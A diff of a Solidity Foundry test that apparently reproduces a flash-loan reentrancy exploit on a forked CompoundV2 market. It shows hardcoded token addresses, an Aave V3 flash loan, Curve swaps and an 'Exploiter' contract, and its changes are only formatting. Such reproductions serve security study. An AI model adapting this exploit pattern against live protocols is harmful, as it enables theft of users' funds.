@@ -14,10 +14,13 @@ import "./../interface.sol";
 // a known reentrancy issue from the forked old version of CompoundV2
 
 interface CurvePool {
+
     function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy) external;
+
 }
 
 contract ContractTest is Test {
+
     IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
     IWFTM WETH = IWFTM(payable(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1));
     IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
@@ -52,7 +55,7 @@ contract ContractTest is Test {
         uint256[] memory amounts = new uint256[](2);
         amounts[0] = 200 * 1e18;
         amounts[1] = 30_000 * 1e6;
-        uint256[] memory modes = new uint[](2);
+        uint256[] memory modes = new uint256[](2);
         modes[0] = 0;
         modes[1] = 0;
         aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
@@ -109,9 +112,11 @@ contract ContractTest is Test {
         curvePool.exchange(0, 2, USDT.balanceOf(address(this)), 0);
         curvePool.exchange(1, 2, WBTC.balanceOf(address(this)), 0);
     }
+
 }
 
 contract Exploiter is Test {
+
     IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
     ICErc20Delegate pETH = ICErc20Delegate(0x375Ae76F0450293e50876D0e5bDC3022CAb23198);
 
@@ -127,4 +132,5 @@ contract Exploiter is Test {
     }
 
     receive() external payable {}
+
 }
